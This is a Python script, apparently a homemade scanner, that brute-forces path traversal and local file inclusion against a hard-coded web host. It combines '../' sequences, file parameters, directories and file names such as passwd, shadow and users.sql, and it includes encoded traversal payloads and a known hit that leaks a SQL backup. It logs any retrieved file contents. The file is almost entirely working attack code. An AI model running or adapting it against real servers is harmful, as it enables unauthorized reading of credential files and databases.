import re
import argparse
import sys
import requests
from http.cookies import SimpleCookie
import time
"http://apache1.willilazarov.cz/?file=../backup/users.sql"
dont = "http://apache1.willilazarov.cz/?file=index.php"

stuff = [
    "",
    "backup/",
    "database/",
    "db/",
    "backup-db/",
    "etc/",
    "var/",
    "var/log/",
    "var/www/files/",
]
tecicky = [
    "",
    "../",
    "../../",
    "../../../",
     "../../../../",

]
files = [
    "",
    "?file=",
    "get-files",
    "get-files?",
    "file:",
    "index.php?p=",
    "get-files?file=",

]
"""
dot_dot = [
    "",
    "etc",
    "/..",
    "....//",
    "//....",
    "%252e%252e%255c",
    "%2e%2e%5c",
    "..%255c",
    "..%5c",
    "%5c../",
    "/%5c..",
    "..\\",
    "%2e%2e%2f",
    "../",
    "../../",
    "../../../",
    "...\\",
    "..../",
    "....\\",
]
"""
words = [
    "",
    "functions",
    "backup",
    "users",
    "connect",
    "shadow",
    "security",
    "comment",
    "passwd",
    "group",
    "user",
    "index",
    "login",
    "home",
    "dashboard",
    "delete",
    "update",
    "remove",
    "access",
    "apache",
    "apache2",
    "httpd",
    "logs",
]
suffix = [
    "",
    ".py",
    ".php",
    ".html",
    ".js",
    ".txt",
    ".sql",
    ".log",

]



def try_all(url):
    a = 0
    for file in files:
        for dot in tecicky:
            for stu in stuff:
                for word in words:
                    for suf in suffix:
                        payload = file + dot + stu + word + suf
                        warning = ""
                        fpositive = False
                        end = dot + stu + word + suf
                        a += 1
                        if a % 200 == 0:
                            print("searching...  " + str(a) + " searched")
                        try:
                            headers = ""
                            full_url = url + payload
                            request = requests.get(full_url)
                            if request.status_code != 400 and request.status_code != 404 and request.status_code != 403:
                                # False positive tests
                                # Isn't normal website content
                                if request.text != normal_con(url):
                                    # isn't error message (to be written)
                                    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
                                    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
                                    if warning1 in request.text or warning2 in request.text:
                                        fpositive = True
                                    # isn't already found path (to be written).......................
                                    if fpositive == False:
                                        print("\n"+ full_url)
                                        print("[+] Status Code: " + str(request.status_code))
                                        for item, value in request.headers.items():
                                            #print(item, value)
                                            headers += "\n" + item + value
                                        print("[+] Headers:" + headers)
                                        # dont want that in a log
                                        if full_url != dont:
                                            print("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                                        else:
                                            print("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                                        try:
                                            f = open("pathLog.txt", "a")
                                            f.write("\n---------------------------------------------------------------------------------------------------")
                                            f.write("\n" + full_url)
                                            f.write("\n---------------------------------------------------------------------------------------------------")
                                            f.write("\n[+] Status Code: " + str(request.status_code))
                                            f.write("\n[+] Headers:" + headers)
                                            # dont want that in a log
                                            if full_url != dont:
                                                f.write("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                                            else:
                                                f.write("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                                            f.close()
                                        except:
                                            print("Problem with file")
                        except:
                            print("URL problem")


def normal_con(url):
    exploit = requests.get(url)
    return exploit.text
    """
    r_first = requests.get(url)
    if r_first.status_code == 200:
        return r_first.content
    else:
        print("Couldn't get website content.")
    """


if __name__ == '__main__':
    f = open("pathLog.txt", "w")
    url = 'http://apache1.willilazarov.cz/'
    try_all(url)
